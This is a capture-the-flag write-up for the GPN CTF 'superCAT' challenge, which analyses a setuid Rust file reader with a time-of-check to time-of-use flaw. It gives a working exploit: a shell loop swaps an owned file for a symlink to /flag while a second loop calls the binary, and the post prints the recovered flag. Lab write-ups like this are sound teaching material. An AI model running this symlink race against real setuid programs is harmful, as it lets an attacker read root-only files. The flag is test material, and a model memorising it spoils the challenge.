---
layout: post
title: "GPN CTF: SuperCat Misc"
tags: [writeup, ctf]
---
{% raw %}
## Challenge: superCAT (Miscellaneous)
## Author: s1nn105
---

### Challenge Description

> SuperCat. DO NOT EAT. The better, newer, more tasteful version of cat. Obv. highly opinionated.

### Download Link: `https://drive.google.com/file/d/1D1zX8IGlmEgu3_cxn1ebu4UPJG6JYjHC/view?usp=sharing`

---

### Initial Setup & Dockerfile Analysis

Download and extract the challenge archive on Kali Linux:

<img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/bc53e236-e27b-4135-99ba-9bd08b4ee9c2" />

Extracting `supercat.tar.gz`:

<img width="684" height="411" alt="image" src="https://github.com/user-attachments/assets/4437d3d1-7a64-45b5-b99f-ba383949b4fb" />

Analyzing the `Dockerfile`:

```bash
cat supercat/Dockerfile
```

<img width="1093" height="510" alt="image" src="https://github.com/user-attachments/assets/7e754017-17ef-4f65-875c-a1d5ed8073b7" />

```dockerfile
FROM rust:1.95-bullseye AS build
COPY . /challenge
WORKDIR /challenge
RUN cargo build --release

FROM debian:bullseye AS flag
ARG Flag "GPNCTF{dummyflag}"
RUN echo ${Flag} > /flag

FROM debian:bullseye AS challenge
RUN useradd -m -u 1000 -s /bin/bash ctf
RUN apt update && apt install socat -y && apt clean

COPY --from=build --chown=root:root --chmod=4755 /challenge/target/release/supercat /usr/local/bin/supercat
COPY --from=flag --chown=root:root --chmod=0400 /flag /flag

USER ctf
WORKDIR /home/ctf
EXPOSE 1337
ENTRYPOINT ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:bash"]
```

Key observations:
* `--chmod=4755`: SUID bit is set on `/usr/local/bin/supercat` -> runs with root privileges.
* `--chmod=0400 /flag`: `/flag` is only readable by root (`uid=0`).
* `USER ctf`: Interactive shell runs under unprivileged user `ctf` (`uid=1000`).
* `socat ... bash`: Each TCP connection spawns a new bash session.

---

### Source Code Analysis

Inspecting `main.rs`:

```rust
use std::fs;
use std::os::unix::fs::MetadataExt;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

#[derive(Debug)]
struct Permissions {
    uid: u32,
    gid: u32,
    groups: Vec<u32>,
}

fn parse_u32_line(line: &str) -> Vec<u32> {
    line.split_whitespace()
        .skip(1)
        .filter_map(|v| v.parse::<u32>().ok())
        .collect()
}

fn get_permissions() -> Permissions {
    let status = std::fs::read_to_string(format!("/proc/{}/status", std::process::id()))
        .expect("could not read own perms");
    let mut uid: u32 = 0;
    let mut gid: u32 = 0;
    let mut groups: Vec<u32> = vec![];
    for l in status.lines() {
        if l.starts_with("Uid") {
            uid = *(parse_u32_line(l).get(0).expect("could not get uid"));
        }
        if l.starts_with("Gid") {
            gid = *(parse_u32_line(l).get(0).expect("could not get gid"));
        }
        if l.starts_with("Groups") {
            groups = parse_u32_line(l);
        }
    }
    Permissions { uid, gid, groups }
}

fn grant_read(file: &Path) {
    let content = fs::read_to_string(file).expect("Could not read file as string");
    print!("{}", content);
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("Usage: {} <file>", args[0]);
        std::process::exit(1);
    }
    let file = Path::new(&args[1]);
    let file_meta = std::fs::metadata(file).expect("could not get file info");
    let fs_mode = file_meta.permissions().mode();
    let user_perms = get_permissions();

    if user_perms.uid == file_meta.uid() && (fs_mode & 0o400) != 0 {
        grant_read(file);
    }
    if (user_perms.gid == file_meta.gid()) && (fs_mode & 0o040) != 0 {
        grant_read(file);
    }
    if user_perms.groups.contains(&(file_meta.gid())) && (fs_mode & 0o040) != 0 {
        grant_read(file)
    }
    if (fs_mode & 0o004) != 0 {
        grant_read(file)
    }
    println!("this super cat wont be tricked by your pesky bribery attempts. Maybe next time try gourmet treats instead of  dog food");
}
```

### Vulnerability: TOCTOU (Time-of-Check to Time-of-Use)

In `main()`:
1. **Check**: The program calls `std::fs::metadata(file)` on the target path to verify if the real user (`uid=1000`) has read permissions.
2. **Use**: If the permission checks pass, it calls `grant_read(file)`, which reads the path using `fs::read_to_string(file)`. Because the binary has SUID root, `read_to_string` runs with effective UID `0` (root).

There is an unavoidable race condition window between metadata validation (check) and reading (use):
```
Check: metadata("/race")       -> owner=ctf, mode=400 (passes check)
       ↕  <-- SWAP /race TO SYMLINK -> /flag DURING THIS RACE WINDOW
Use:   read_to_string("/race") -> follows symlink to /flag -> reads as root!
```

---

### Exploitation

Open two concurrent connections to the target instance:

**Terminal 1:** Loop creating a regular owned file and replacing it with a symlink to `/flag`:

```bash
ncat --ssl grilled-filet-wrapped-in-emulsified-spaetzle-nsqe.gpn24.ctf.kitctf.de 443
```

```bash
mkdir -p ~/race_dir
echo test > ~/race_dir/myfile
chmod 400 ~/race_dir/myfile
while true; do
    rm -f ~/race_dir/race
    cp ~/race_dir/myfile ~/race_dir/race
    rm -f ~/race_dir/race
    ln -sf /flag ~/race_dir/race
done
```

<img width="1920" height="979" alt="image" src="https://github.com/user-attachments/assets/09bf39a9-23b4-491c-8ef4-c264477614f8" />

**Terminal 2:** Continuously execute `supercat` on `~/race_dir/race`:

```bash
ncat --ssl grilled-filet-wrapped-in-emulsified-spaetzle-nsqe.gpn24.ctf.kitctf.de 443
```

```bash
while true; do supercat ~/race_dir/race 2>/dev/null; done | grep -v "tricked"
```

<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/6c4b66b5-0d68-4699-a891-db7c62085149" />

When the race condition is won, the flag output appears:

```
test
test
GPNCTF{Rust_IS_ShiT_CHan6E_MY_MInd}
test
...
```

---

## Flag

```
GPNCTF{Rust_IS_ShiT_CHan6E_MY_MInd}
```

---
**zeroD**

{% endraw %}
